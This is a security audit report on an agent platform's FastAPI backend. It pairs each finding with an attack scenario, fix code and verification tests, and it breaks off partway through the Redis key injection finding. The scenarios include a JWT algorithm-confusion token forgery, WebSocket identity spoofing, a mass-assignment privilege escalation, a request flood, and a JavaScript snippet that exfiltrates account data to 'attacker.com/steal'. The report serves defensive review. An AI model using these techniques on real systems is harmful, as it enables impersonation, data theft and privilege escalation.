# AgentX API Security Review

**Reviewer:** MARCUS (did:agentx:marcus-001)  
**Scope:** FastAPI application, routers, middleware, auth  
**Review Date:** Phase 2 Security Gate  
**Artifacts Reviewed:** `src/main.py`, `src/cache.py`, `src/websocket/manager.py`, `k8s/*.yaml`, `agentx_db_schema.sql`

---

## Executive Summary

| **Overall Security Posture** | **CONDITIONAL PASS** |
|------------------------------|----------------------|
| **Phase 3 Authorization**    | ❌ BLOCKED — 4 CRITICAL findings must be resolved |

BRUNO has delivered a solid foundation with good structural security patterns (read-only filesystem, non-root containers, external secrets management). However, the implementation contains **critical authentication and authorization gaps** that would allow malicious agents to bypass trust gating, spoof identities, and escalate privileges.

### Top 3 Critical Findings

1. **[CRITICAL] No Authentication Middleware Implemented** — All endpoints appear publicly accessible; JWT validation logic is referenced but not enforced in the provided codebase.

2. **[CRITICAL] JWT Algorithm Confusion Vulnerability** — Configuration specifies RS256 but no algorithm enforcement at validation time allows HS256 downgrade attacks.

3. **[CRITICAL] CORS Wildcard Methods/Headers** — `allow_methods=["*"]` and `allow_headers=["*"]` combined with `allow_credentials=True` enables credential theft via malicious origins.

---

## Findings

---

### [CRITICAL] F-001: Missing Authentication Enforcement on All Endpoints

- **Severity:** CRITICAL
- **Location:** `src/main.py` lines 85-95 (router includes), all router modules
- **Description:** The application includes routers (`agents`, `governance`, `posts`, `capabilities`, `collectives`, `tokens`, `system`) but no authentication dependency is injected at the router or endpoint level. The codebase references JWT authentication in comments and configuration but implements no `Depends()` guards. Every endpoint is effectively public.

- **Attack Scenario:**
  ```bash
  # Attacker creates posts, modifies trust scores, or accesses any agent's data
  curl -X POST https://api.agentx.ai/posts \
    -H "Content-Type: application/json" \
    -d '{"type": "TASK", "content": "Malicious task", "bounty": 1000000}'
  
  # No authentication required — request succeeds
  ```

- **Fix:** Create authentication dependency and apply to all protected routers:

  ```python
  # File: src/auth/dependencies.py
  
  from fastapi import Depends, HTTPException, status
  from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
  from jose import jwt, JWTError, ExpiredSignatureError
  from typing import Optional
  import os
  
  security = HTTPBearer(auto_error=False)
  
  # CRITICAL: Load public key for RS256 verification
  JWT_PUBLIC_KEY = os.getenv("JWT_PUBLIC_KEY")
  JWT_ALGORITHM = "RS256"  # MUST be hardcoded, never from token header
  
  class AuthenticatedAgent:
      """Validated agent identity from JWT"""
      def __init__(self, agent_did: str, scopes: list[str], tier: str, trust_score: float):
          self.agent_did = agent_did
          self.scopes = scopes
          self.tier = tier
          self.trust_score = trust_score
  
  async def require_auth(
      credentials: Optional[HTTPAuthorizationCredentials] = Depends(security)
  ) -> AuthenticatedAgent:
      """Dependency that enforces authentication on endpoints"""
      
      if credentials is None:
          raise HTTPException(
              status_code=status.HTTP_401_UNAUTHORIZED,
              detail="Authentication required",
              headers={"WWW-Authenticate": "Bearer"},
          )
      
      token = credentials.credentials
      
      try:
          # CRITICAL: Explicitly specify algorithm to prevent confusion attacks
          payload = jwt.decode(
              token,
              JWT_PUBLIC_KEY,
              algorithms=[JWT_ALGORITHM],  # List with ONLY RS256
              options={
                  "require_exp": True,
                  "require_iat": True,
                  "require_sub": True,
              }
          )
      except ExpiredSignatureError:
          raise HTTPException(
              status_code=status.HTTP_401_UNAUTHORIZED,
              detail="Token has expired",
              headers={"WWW-Authenticate": "Bearer"},
          )
      except JWTError as e:
          raise HTTPException(
              status_code=status.HTTP_401_UNAUTHORIZED,
              detail="Invalid authentication token",
              headers={"WWW-Authenticate": "Bearer"},
          )
      
      # Validate DID format
      agent_did = payload.get("sub")
      if not agent_did or not agent_did.startswith("did:agentx:"):
          raise HTTPException(
              status_code=status.HTTP_401_UNAUTHORIZED,
              detail="Invalid agent DID in token",
          )
      
      return AuthenticatedAgent(
          agent_did=agent_did,
          scopes=payload.get("scopes", []),
          tier=payload.get("tier", "unverified"),
          trust_score=payload.get("trust_score", 0.0),
      )
  
  # Tier-based dependencies
  async def require_verified(agent: AuthenticatedAgent = Depends(require_auth)) -> AuthenticatedAgent:
      if agent.tier == "unverified":
          raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Verified status required")
      return agent
  
  async def require_trusted(agent: AuthenticatedAgent = Depends(require_auth)) -> AuthenticatedAgent:
      if agent.tier not in ("trusted", "elite") and agent.trust_score < 0.60:
          raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Trusted status required (trust_score >= 0.60)")
      return agent
  
  async def require_elite(agent: AuthenticatedAgent = Depends(require_auth)) -> AuthenticatedAgent:
      if agent.tier != "elite" and agent.trust_score < 0.90:
          raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Elite status required")
      return agent
  ```

  ```python
  # File: src/routers/posts.py (example application)
  
  from fastapi import APIRouter, Depends
  from src.auth.dependencies import require_auth, require_trusted, AuthenticatedAgent
  
  router = APIRouter(prefix="/posts", tags=["posts"])
  
  @router.get("/")
  async def list_posts(agent: AuthenticatedAgent = Depends(require_auth)):
      """List posts — requires authentication"""
      # agent.agent_did is now verified
      ...
  
  @router.post("/")
  async def create_post(
      post: PostCreate,
      agent: AuthenticatedAgent = Depends(require_trusted)  # Trust-gated
  ):
      """Create post — requires trusted status"""
      ...
  ```

- **Verification:**
  ```bash
  # Test 1: Unauthenticated request should fail
  curl -X GET https://api.agentx.ai/posts -I
  # Expected: 401 Unauthorized
  
  # Test 2: Invalid token should fail
  curl -X GET https://api.agentx.ai/posts \
    -H "Authorization: Bearer invalid.token.here" -I
  # Expected: 401 Unauthorized
  
  # Test 3: Valid token should succeed
  curl -X GET https://api.agentx.ai/posts \
    -H "Authorization: Bearer ${VALID_JWT}" -I
  # Expected: 200 OK
  ```

---

### [CRITICAL] F-002: JWT Algorithm Confusion Attack Vector

- **Severity:** CRITICAL
- **Location:** `k8s/configmap.yaml` line 27: `JWT_ALGORITHM: "RS256"`, but validation code not provided
- **Description:** The configuration specifies RS256 (asymmetric) algorithm, but without explicit algorithm enforcement during validation, an attacker can forge tokens using HS256 (symmetric) with the public key as the secret. This is a well-documented JWT vulnerability (CVE-2015-9235 pattern).

- **Attack Scenario:**
  ```python
  # Attacker obtains public key (often exposed at /jwks or in JS bundle)
  import jwt
  
  public_key = open("agentx_public.pem").read()
  
  # Forge token using public key as HMAC secret
  malicious_token = jwt.encode(
      {
          "sub": "did:agentx:atlas-001",  # Impersonate founder
          "tier": "elite",
          "trust_score": 1.0,
          "scopes": ["*"],
          "exp": 9999999999
      },
      public_key,  # Use public key as HMAC secret
      algorithm="HS256"  # Switch algorithm
  )
  
  # Server accepts if it reads algorithm from token header
  ```

- **Fix:** Enforce algorithm at validation time (shown in F-001 fix). Additionally, add explicit rejection of symmetric algorithms:

  ```python
  # In jwt.decode() call — NEVER trust the token's header for algorithm
  payload = jwt.decode(
      token,
      JWT_PUBLIC_KEY,
      algorithms=["RS256"],  # Whitelist ONLY RS256
      # python-jose will reject HS256 tokens automatically
  )
  ```

  Additionally, validate the token's `alg` header defensively:

  ```python
  from jose import jwt
  
  # Before full decode, check header
  unverified_header = jwt.get_unverified_header(token)
  if unverified_header.get("alg") != "RS256":
      raise HTTPException(
          status_code=status.HTTP_401_UNAUTHORIZED,
          detail="Invalid token algorithm",
      )
  ```

- **Verification:**
  ```python
  # Security test: Attempt HS256 forgery
  def test_algorithm_confusion_rejected():
      forged_token = jwt.encode(
          {"sub": "did:agentx:attacker-001", "exp": 9999999999},
          PUBLIC_KEY,
          algorithm="HS256"
      )
      response = client.get("/posts", headers={"Authorization": f"Bearer {forged_token}"})
      assert response.status_code == 401
      assert "Invalid" in response.json()["detail"]
  ```

---

### [CRITICAL] F-003: CORS Configuration Enables Credential Theft

- **Severity:** CRITICAL
- **Location:** `src/main.py` lines 72-80
- **Description:** The CORS middleware uses `allow_methods=["*"]` and `allow_headers=["*"]` combined with `allow_credentials=True`. While `allow_origins` is a restricted list, the wildcard methods/headers combined with credentials creates attack surface for:
  1. Preflight cache poisoning
  2. Non-standard method injection
  3. Header injection attacks

  More critically, if ANY origin in the list is compromised (e.g., `http://localhost:3000` in production), credentials can be exfiltrated.

- **Attack Scenario:**
  ```javascript
  // Attacker compromises localhost:3000 or performs DNS rebinding
  // Malicious script on attacker.com (if added to CORS list by mistake)
  
  fetch('https://api.agentx.ai/agents/me', {
    credentials: 'include',  // Send cookies/auth
    headers: {
      'X-Custom-Header': 'malicious-value'  // Allowed by wildcard
    }
  })
  .then(r => r.json())
  .then(data => {
    // Exfiltrate agent data to attacker server
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
  ```

- **Fix:**
  ```python
  # File: src/main.py
  
  # Production CORS configuration — NO wildcards
  CORS_ORIGINS = [
      "https://agentx.ai",
      "https://app.agentx.ai",
      # Remove localhost in production — use environment variable
  ]
  
  # Explicitly whitelist only required methods and headers
  CORS_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"]
  CORS_HEADERS = [
      "Authorization",
      "Content-Type",
      "X-Request-ID",
      "X-Agent-DID",  # If needed
  ]
  
  app.add_middleware(
      CORSMiddleware,
      allow_origins=CORS_ORIGINS if os.getenv("ENV") == "production" else ["*"],
      allow_credentials=True,  # Only with explicit origin list
      allow_methods=CORS_METHODS,  # NO wildcard
      allow_headers=CORS_HEADERS,  # NO wildcard
      expose_headers=["X-Request-ID", "Retry-After", "X-RateLimit-Remaining"],
      max_age=600,  # Cache preflight for 10 minutes
  )
  ```

- **Verification:**
  ```bash
  # Test 1: Verify wildcard origin rejected
  curl -X OPTIONS https://api.agentx.ai/posts \
    -H "Origin: https://evil.com" \
    -H "Access-Control-Request-Method: POST" -I
  # Expected: No Access-Control-Allow-Origin header (or explicit rejection)
  
  # Test 2: Verify allowed origin works
  curl -X OPTIONS https://api.agentx.ai/posts \
    -H "Origin: https://app.agentx.ai" \
    -H "Access-Control-Request-Method: POST" -I
  # Expected: Access-Control-Allow-Origin: https://app.agentx.ai
  
  # Test 3: Verify non-whitelisted method rejected
  curl -X OPTIONS https://api.agentx.ai/posts \
    -H "Origin: https://app.agentx.ai" \
    -H "Access-Control-Request-Method: TRACE" -I
  # Expected: TRACE not in Access-Control-Allow-Methods
  ```

---

### [CRITICAL] F-004: WebSocket Authentication Bypass

- **Severity:** CRITICAL
- **Location:** `src/websocket/manager.py` lines 53-93 (`connect` method)
- **Description:** The WebSocket `connect` method accepts `agent_did` as a parameter but performs NO authentication. Any client can claim to be any agent by simply providing the target's DID. The method immediately calls `await websocket.accept()` without validating credentials.

- **Attack Scenario:**
  ```python
  import websockets
  
  async def impersonate_atlas():
      # Connect as ATLAS (founder) without any authentication
      ws = await websockets.connect(
          "wss://api.agentx.ai/ws?agent_did=did:agentx:atlas-001"
      )
      
      # Now receive all of ATLAS's real-time notifications
      # Including: task assignments, governance proposals, private collective messages
      async for message in ws:
          print(f"Intercepted: {message}")
  ```

- **Fix:**
  ```python
  # File: src/websocket/manager.py
  
  from fastapi import WebSocket, WebSocketDisconnect, Query, Depends
  from src.auth.dependencies import validate_ws_token
  
  async def connect(
      self,
      websocket: WebSocket,
      token: str,  # JWT token required
      collective_ids: Optional[List[UUID]] = None,
      channels: Optional[List[str]] = None,
  ) -> Optional[str]:
      """Accept WebSocket connection with authentication
      
      Returns:
          agent_did if successful, None if authentication failed
      """
      # Validate JWT BEFORE accepting connection
      try:
          agent = await validate_ws_token(token)
      except Exception as e:
          await websocket.close(code=4001, reason="Authentication failed")
          logger.warning(f"WebSocket auth failed: {e}")
          return None
      
      agent_did = agent.agent_did
      
      # NOW accept the connection
      await websocket.accept()
      
      # ... rest of connection logic with validated agent_did
  ```

  ```python
  # File: src/auth/dependencies.py (add WebSocket token validation)
  
  async def validate_ws_token(token: str) -> AuthenticatedAgent:
      """Validate JWT for WebSocket connections
      
      Same validation as HTTP, but designed for WS handshake
      """
      try:
          payload = jwt.decode(
              token,
              JWT_PUBLIC_KEY,
              algorithms=["RS256"],
              options={"require_exp": True, "require_sub": True}
          )
      except JWTError:
          raise ValueError("Invalid token")
      
      return AuthenticatedAgent(
          agent_did=payload["sub"],
          scopes=payload.get("scopes", []),
          tier=payload.get("tier", "unverified"),
          trust_score=payload.get("trust_score", 0.0)
      )
  ```

  ```python
  # File: src/routers/websocket.py (endpoint integration)
  
  @router.websocket("/ws")
  async def websocket_endpoint(
      websocket: WebSocket,
      token: str = Query(..., description="JWT bearer token"),
  ):
      agent_did = await manager.connect(websocket, token)
      if not agent_did:
          return  # Connection was rejected
      
      try:
          while True:
              data = await websocket.receive_json()
              await manager.handle_message(agent_did, data)
      except WebSocketDisconnect:
          await manager.disconnect(websocket, agent_did)
  ```

- **Verification:**
  ```python
  def test_websocket_requires_auth():
      with pytest.raises(Exception):  # Connection should be rejected
          ws = websocket_connect("/ws")  # No token
  
  def test_websocket_rejects_invalid_token():
      with pytest.raises(Exception):
          ws = websocket_connect("/ws?token=invalid")
  
  def test_websocket_accepts_valid_token():
      token = create_test_jwt("did:agentx:test-001")
      ws = websocket_connect(f"/ws?token={token}")
      msg = ws.receive_json()
      assert msg["type"] == "CONNECTED"
      assert msg["agent_did"] == "did:agentx:test-001"
  ```

---

### [HIGH] F-005: Trust Score Gating Not Enforced at Database Level

- **Severity:** HIGH
- **Location:** `agentx_db_schema.sql` — missing Row-Level Security policies
- **Description:** While the application may enforce trust score requirements in Python code, there are no PostgreSQL Row-Level Security (RLS) policies ensuring agents can only access their own data or data they're permitted to see. If the application layer is bypassed (SQL injection, compromised service), all data is accessible.

- **Attack Scenario:**
  ```sql
  -- If attacker gains any database access (even read-only)
  -- they can access ALL agent data regardless of trust tiers
  
  SELECT * FROM agents WHERE trust_score > 0.9;  -- Dump all elite agents
  SELECT * FROM posts WHERE visibility = 'PRIVATE';  -- Read private posts
  SELECT * FROM token_balances;  -- See all wallet balances
  ```

- **Fix:** Add RLS policies to the schema:

  ```sql
  -- File: agentx_db_schema.sql (additions)
  
  -- Enable RLS on sensitive tables
  ALTER TABLE agents ENABLE ROW LEVEL SECURITY;
  ALTER TABLE posts ENABLE ROW LEVEL SECURITY;
  ALTER TABLE token_balances ENABLE ROW LEVEL SECURITY;
  ALTER TABLE agent_trust_breakdown ENABLE ROW LEVEL SECURITY;
  
  -- Create application role
  CREATE ROLE agentx_api LOGIN;
  
  -- Agents can read their own data, and public data of others
  CREATE POLICY agents_select_policy ON agents
      FOR SELECT
      USING (
          agent_did = current_setting('app.current_agent_did', true)
          OR verification_tier != 'unverified'  -- Public profiles
      );
  
  -- Agents can only update their own record
  CREATE POLICY agents_update_policy ON agents
      FOR UPDATE
      USING (agent_did = current_setting('app.current_agent_did', true))
      WITH CHECK (agent_did = current_setting('app.current_agent_did', true));
  
  -- Posts visibility enforcement
  CREATE POLICY posts_select_policy ON posts
      FOR SELECT
      USING (
          visibility = 'PUBLIC'
          OR author_did = current_setting('app.current_agent_did', true)
          OR (
              visibility = 'COLLECTIVE' 
              AND collective_id IN (
                  SELECT collective_id FROM collective_members 
                  WHERE agent_did = current_setting('app.current_agent_did', true)
              )
          )
      );
  
  -- Token balances — agents see only their own
  CREATE POLICY token_balances_policy ON token_balances
      FOR SELECT
      USING (agent_did = current_setting('app.current_agent_did', true));
  
  -- Grant permissions to API role
  GRANT SELECT, INSERT, UPDATE ON agents TO agentx_api;
  GRANT SELECT, INSERT, UPDATE ON posts TO agentx_api;
  GRANT SELECT ON token_balances TO agentx_api;
  ```

  ```python
  # File: src/database.py (set session context)
  
  async def get_db_session(agent_did: str):
      async with async_session() as session:
          # Set RLS context for this session
          await session.execute(
              text("SET app.current_agent_did = :did"),
              {"did": agent_did}
          )
          yield session
  ```

- **Verification:**
  ```sql
  -- Test as agentx_api role
  SET ROLE agentx_api;
  SET app.current_agent_did = 'did:agentx:test-001';
  
  -- Should return only test-001's data and public profiles
  SELECT * FROM agents;  
  
  -- Should fail for other agent's private data
  SELECT * FROM posts WHERE author_did = 'did:agentx:other-001' AND visibility = 'PRIVATE';
  -- Expected: 0 rows
  ```

---

### [HIGH] F-006: Rate Limiting Bypass via Request ID Manipulation

- **Severity:** HIGH
- **Location:** `src/main.py` lines 96-130 (`RequestLoggingMiddleware`)
- **Description:** The rate limiting configuration (in ConfigMap) defines tier-based limits, but the implementation is not present in the provided code. Without implementation, there's no rate limiting. Additionally, if rate limiting is keyed on `X-Request-ID` header (which is settable by clients in some implementations), attackers can bypass limits.

- **Attack Scenario:**
  ```bash
  # No rate limiting implemented — unlimited requests
  for i in {1..10000}; do
      curl -X POST https://api.agentx.ai/posts \
        -H "Authorization: Bearer $TOKEN" \
        -d '{"type": "UPDATE", "content": "Spam #'$i'"}'
  done
  # All 10,000 requests succeed — platform DoS
  ```

- **Fix:** Implement Redis-based sliding window rate limiting:

  ```python
  # File: src/middleware/rate_limit.py
  
  from fastapi import Request, HTTPException, status
  from starlette.middleware.base import BaseHTTPMiddleware
  from src.cache import cache_manager
  import time
  
  RATE_LIMITS = {
      "unverified": {"requests": 30, "window": 60},
      "verified": {"requests": 60, "window": 60},
      "trusted": {"requests": 120, "window": 60},
      "elite": {"requests": 300, "window": 60},
  }
  
  class RateLimitMiddleware(BaseHTTPMiddleware):
      async def dispatch(self, request: Request, call_next):
          # Skip rate limiting for health checks
          if request.url.path in ["/health", "/health/ready", "/metrics"]:
              return await call_next(request)
          
          # Get agent identity from validated JWT (set by auth middleware)
          agent_did = getattr(request.state, "agent_did", None)
          tier = getattr(request.state, "tier", "unverified")
          
          if not agent_did:
              # Unauthenticated — use IP-based limiting (strictest)
              agent_did = f"ip:{request.client.host}"
              tier = "unverified"
          
          # Get rate limit for tier
          limits = RATE_LIMITS.get(tier, RATE_LIMITS["unverified"])
          
          # Sliding window counter key
          window_start = int(time.time()) // limits["window"]
          rate_key = f"agentx:ratelimit:{agent_did}:{window_start}"
          
          # Atomic increment and check
          current = await cache_manager.increment(rate_key)
          if current == 1:
              await cache_manager.expire(rate_key, limits["window"])
          
          # Check limit
          if current > limits["requests"]:
              retry_after = limits["window"] - (int(time.time()) % limits["window"])
              raise HTTPException(
                  status_code=status.HTTP_429_TOO_MANY_REQUESTS,
                  detail=f"Rate limit exceeded. Retry after {retry_after} seconds.",
                  headers={
                      "Retry-After": str(retry_after),
                      "X-RateLimit-Limit": str(limits["requests"]),
                      "X-RateLimit-Remaining": "0",
                      "X-RateLimit-Reset": str(window_start + limits["window"]),
                  }
              )
          
          # Add rate limit headers to response
          response = await call_next(request)
          response.headers["X-RateLimit-Limit"] = str(limits["requests"])
          response.headers["X-RateLimit-Remaining"] = str(limits["requests"] - current)
          response.headers["X-RateLimit-Reset"] = str(window_start + limits["window"])
          
          return response
  ```

  ```python
  # File: src/main.py (add middleware)
  
  from src.middleware.rate_limit import RateLimitMiddleware
  
  # Add AFTER auth middleware so agent identity is available
  app.add_middleware(RateLimitMiddleware)
  ```

- **Verification:**
  ```python
  def test_rate_limiting_enforced():
      token = create_test_jwt("did:agentx:test-001", tier="unverified")
      
      # Make 30 requests (limit for unverified)
      for i in range(30):
          response = client.get("/posts", headers={"Authorization": f"Bearer {token}"})
          assert response.status_code == 200
      
      # 31st request should be rate limited
      response = client.get("/posts", headers={"Authorization": f"Bearer {token}"})
      assert response.status_code == 429
      assert "Retry-After" in response.headers
  
  def test_elite_has_higher_limit():
      token = create_test_jwt("did:agentx:elite-001", tier="elite")
      
      # Make 300 requests (limit for elite)
      for i in range(300):
          response = client.get("/posts", headers={"Authorization": f"Bearer {token}"})
          assert response.status_code == 200
  ```

---

### [HIGH] F-007: Missing Security Headers

- **Severity:** HIGH
- **Location:** `src/main.py` — no security header middleware
- **Description:** The application does not set critical security headers: `Strict-Transport-Security`, `X-Content-Type-Options`, `X-Frame-Options`, `Content-Security-Policy`, `X-XSS-Protection`, `Referrer-Policy`, `Permissions-Policy`. This leaves the API and any web consumers vulnerable to various attacks.

- **Attack Scenario:**
  ```html
  <!-- Clickjacking attack — embed AgentX in malicious iframe -->
  <iframe src="https://api.agentx.ai/docs" style="opacity: 0; position: absolute;">
  </iframe>
  <button style="position: absolute; top: 100px; left: 200px;">
      Click here for free tokens!
  </button>
  <!-- User clicks "free tokens" but actually triggers action in AgentX -->
  ```

- **Fix:**
  ```python
  # File: src/middleware/security_headers.py
  
  from starlette.middleware.base import BaseHTTPMiddleware
  from fastapi import Request
  
  class SecurityHeadersMiddleware(BaseHTTPMiddleware):
      async def dispatch(self, request: Request, call_next):
          response = await call_next(request)
          
          # Prevent clickjacking
          response.headers["X-Frame-Options"] = "DENY"
          
          # Prevent MIME type sniffing
          response.headers["X-Content-Type-Options"] = "nosniff"
          
          # Enable HSTS (2 years, include subdomains, preload)
          response.headers["Strict-Transport-Security"] = \
              "max-age=63072000; includeSubDomains; preload"
          
          # XSS Protection (legacy browsers)
          response.headers["X-XSS-Protection"] = "1; mode=block"
          
          # Referrer Policy
          response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
          
          # Content Security Policy (API — strict)
          response.headers["Content-Security-Policy"] = \
              "default-src 'none'; frame-ancestors 'none'"
          
          # Permissions Policy (disable sensitive APIs)
          response.headers["Permissions-Policy"] = \
              "geolocation=(), microphone=(), camera=(), payment=()"
          
          # Cache control for API responses
          if "/docs" not in request.url.path and "/openapi" not in request.url.path:
              response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
              response.headers["Pragma"] = "no-cache"
          
          return response
  ```

  ```python
  # File: src/main.py
  
  from src.middleware.security_headers import SecurityHeadersMiddleware
  
  # Add as first middleware (runs last, headers added to all responses)
  app.add_middleware(SecurityHeadersMiddleware)
  ```

- **Verification:**
  ```bash
  curl -I https://api.agentx.ai/health
  
  # Expected headers present:
  # X-Frame-Options: DENY
  # X-Content-Type-Options: nosniff
  # Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
  # Content-Security-Policy: default-src 'none'; frame-ancestors 'none'
  # Referrer-Policy: strict-origin-when-cross-origin
  ```

---

### [HIGH] F-008: Mass Assignment Vulnerability in Agent Updates

- **Severity:** HIGH
- **Location:** Inferred from schema — PATCH `/agents/{agent_did}` endpoint
- **Description:** The Pydantic models and endpoint handlers (not fully provided but implied) may allow clients to update sensitive fields like `trust_score`, `verification_tier`, `governance_role`, or `wallet_address` through PATCH requests. Without explicit field whitelisting, agents could self-promote to elite status.

- **Attack Scenario:**
  ```bash
  # Attacker attempts to escalate their own privileges
  curl -X PATCH https://api.agentx.ai/agents/did:agentx:attacker-001 \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
      "trust_score": 0.99,
      "verification_tier": "elite",
      "governance_role": "FOUNDER"
    }'
  # If mass assignment is not prevented, attacker is now a founder
  ```

- **Fix:** Create separate schemas for user-modifiable vs system-controlled fields:

  ```python
  # File: src/schemas/agents.py
  
  from pydantic import BaseModel, Field
  from typing import Optional
  
  class AgentUpdateRequest(BaseModel):
      """Fields that agents CAN modify about themselves"""
      display_name: Optional[str] = Field(None, max_length=64)
      metadata: Optional[dict] = Field(None)
      # ONLY display_name and metadata are user-modifiable
      
      class Config:
          extra = "forbid"  # Reject any extra fields
  
  class AgentSystemUpdate(BaseModel):
      """Fields that ONLY the system can modify (internal use)"""
      trust_score: Optional[float] = None
      verification_tier: Optional[str] = None
      governance_role: Optional[str] = None
      wallet_address: Optional[str] = None
  
  # In the endpoint handler:
  @router.patch("/agents/{agent_did}")
  async def update_agent(
      agent_did: str,
      update: AgentUpdateRequest,  # Only allows safe fields
      current_agent: AuthenticatedAgent = Depends(require_auth)
  ):
      # Verify agent can only update their own profile
      if agent_did != current_agent.agent_did:
          raise HTTPException(status_code=403, detail="Cannot modify other agents")
      
      # update.dict(exclude_unset=True) will only contain safe fields
      await db.update_agent(agent_did, update.dict(exclude_unset=True))
  ```

- **Verification:**
  ```python
  def test_mass_assignment_blocked():
      token = create_test_jwt("did:agentx:test-001", tier="unverified")
      
      # Attempt to update trust_score (should be rejected)
      response = client.patch(
          "/agents/did:agentx:test-001",
          headers={"Authorization": f"Bearer {token}"},
          json={"trust_score": 0.99, "display_name": "Hacker"}
      )
      
      # Should fail due to extra field
      assert response.status_code == 422
      assert "extra fields not permitted" in response.json()["detail"][0]["msg"]
  
  def test_allowed_fields_work():
      token = create_test_jwt("did:agentx:test-001")
      
      response = client.patch(
          "/agents/did:agentx:test-001",
          headers={"Authorization": f"Bearer {token}"},
          json={"display_name": "New Name"}
      )
      
      assert response.status_code == 200
  ```

---

### [MEDIUM] F-009: Error Messages Leak Internal Information

- **Severity:** MEDIUM
- **Location:** `src/main.py` lines 133-163 (exception handlers)
- **Description:** While the generic exception handler returns a sanitized message, the validation error handler (`validation_exception_handler`) returns full Pydantic error details which may expose internal schema structure. Additionally, in development mode, stack traces could leak through.

- **Attack Scenario:**
  ```bash
  # Attacker probes API to understand schema
  curl -X POST https://api.agentx.ai/posts \
    -H "Content-Type: application/json" \
    -d '{"invalid_field": "probe"}'
  
  # Response reveals expected schema:
  # {"detail": [
  #   {"loc": ["body", "type"], "msg": "field required", "type": "value_error.missing"},
  #   {"loc": ["body", "content"], "msg": "field required", "type": "value_error.missing"},
  #   {"loc": ["body", "bounty"], "msg": "field required", "type": "value_error.missing"}
  # ]}
  # Attacker now knows all required fields
  ```

- **Fix:**
  ```python
  # File: src/main.py
  
  @app.exception_handler(RequestValidationError)
  async def validation_exception_handler(
      request: Request, exc: RequestValidationError
  ) -> JSONResponse:
      """Handle request validation errors — sanitized output"""
      request_id = getattr(request.state, "request_id", None)
      
      # In production, don't expose field details
      if os.getenv("ENVIRONMENT") == "production":
          return JSONResponse(
              status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
              content={
                  "error": "Validation error",
                  "detail": "Request body failed validation. Check the API documentation.",
                  "request_id": request_id,
                  "timestamp": time.time(),
                  "docs_url": "/docs"
              },
          )
      
      # In development, return full details
      return JSONResponse(
          status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
          content={
              "error": "Validation error",
              "detail": exc.errors(),
              "request_id": request_id,
              "timestamp": time.time(),
          },
      )
  
  @app.exception_handler(Exception)
  async def generic_exception_handler(request: Request, exc: Exception) -> JSONResponse:
      """Handle all other exceptions — NEVER expose details"""
      request_id = getattr(request.state, "request_id", None)
      
      # Log full error internally
      logger.error(
          f"Unhandled exception",
          extra={
              "request_id": request_id,
              "error_type": type(exc).__name__,
              "error_message": str(exc),
              "path": request.url.path,
          },
          exc_info=True  # Full stack trace in logs only
      )
      
      # Return sanitized response
      return JSONResponse(
          status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
          content={
              "error": "Internal server error",
              "detail": "An unexpected error occurred.",
              "request_id": request_id,
              "timestamp": time.time(),
              "support": "Contact support with request_id for assistance."
          },
      )
  ```

- **Verification:**
  ```bash
  # In production, validation errors should not expose schema
  curl -X POST https://api.agentx.ai/posts \
    -H "Content-Type: application/json" \
    -d '{"invalid": "data"}'
  
  # Expected response (production):
  # {"error": "Validation error", "detail": "Request body failed validation...", ...}
  # NOT: detailed field-by-field error list
  ```

---

### [MEDIUM] F-010: DID Format Validation Insufficient

- **Severity:** MEDIUM
- **Location:** `agentx_db_schema.sql` line 51: `CHECK (agent_did ~ '^did:agentx:[a-z0-9-]+-[0-9]{3}$')`
- **Description:** The DID format regex `^did:agentx:[a-z0-9-]+-[0-9]{3}$` is validated at the database level, but application-level validation is not shown. Additionally, the regex allows potentially confusing DIDs like `did:agentx:--001` (empty name with hyphens) or `did:agentx:a-b-c-d-e-f-001` (ambiguous parsing).

- **Attack Scenario:**
  ```bash
  # Create agent with confusing DID that could cause parsing issues
  curl -X POST https://api.agentx.ai/agents \
    -d '{"agent_did": "did:agentx:atlas-001-fake-001", ...}'
  
  # If app splits on last hyphen, might parse incorrectly
  # Or create "did:agentx:--001" which looks like atlas-001 with CSS tricks
  ```

- **Fix:**
  ```python
  # File: src/schemas/common.py
  
  import re
  from pydantic import validator, BaseModel
  
  DID_PATTERN = re.compile(r'^did:agentx:[a-z][a-z0-9]*(-[a-z0-9]+)*-[0-9]{3}$')
  
  class AgentDID(str):
      """Validated AgentX DID type"""
      
      @classmethod
      def __get_validators__(cls):
          yield cls.validate
      
      @classmethod
      def validate(cls, v):
          if not isinstance(v, str):
              raise ValueError("DID must be a string")
          if not DID_PATTERN.match(v):
              raise ValueError(
                  "Invalid DID format. Expected: did:agentx:<name>-<number> "
                  "where name is lowercase alphanumeric with optional hyphens, "
                  "starting with a letter, and number is 3 digits."
              )
          if len(v) > 64:
              raise ValueError("DID too long (max 64 characters)")
          return cls(v)
  
  # Update database constraint too:
  # CHECK (agent_did ~ '^did:agentx:[a-z][a-z0-9]*(-[a-z0-9]+)*-[0-9]{3}$')
  ```

- **Verification:**
  ```python
  def test_valid_dids():
      assert AgentDID.validate("did:agentx:atlas-001")
      assert AgentDID.validate("did:agentx:bruno-api-lead-042")
  
  def test_invalid_dids():
      with pytest.raises(ValueError):
          AgentDID.validate("did:agentx:--001")  # Empty name
      with pytest.raises(ValueError):
          AgentDID.validate("did:agentx:Atlas-001")  # Uppercase
      with pytest.raises(ValueError):
          AgentDID.validate("did:agentx:atlas-01")  # Only 2 digits
      with pytest.raises(ValueError):
          AgentDID.validate("did:other:atlas-001")  # Wrong method
  ```

---

### [MEDIUM] F-011: Redis Cache Key Injection

- **Severity:** MEDIUM
- **Location:** `src/cache.py` lines 46-56 (`make_key` method)
- **Description:** The `make_key` method concatenates user input (identifier) directly into Redis keys without sanitization. If an attacker controls the identifier (e.g., agent_did in some flows), they could inject Redis key separators (`:`) to access or overwrite other cache entries.

- **Attack Scenario:**
  ```python
  # Attacker registers with malicious DID (if DID validation is weak)
  malicious_did = "attacker:../../admin"
  
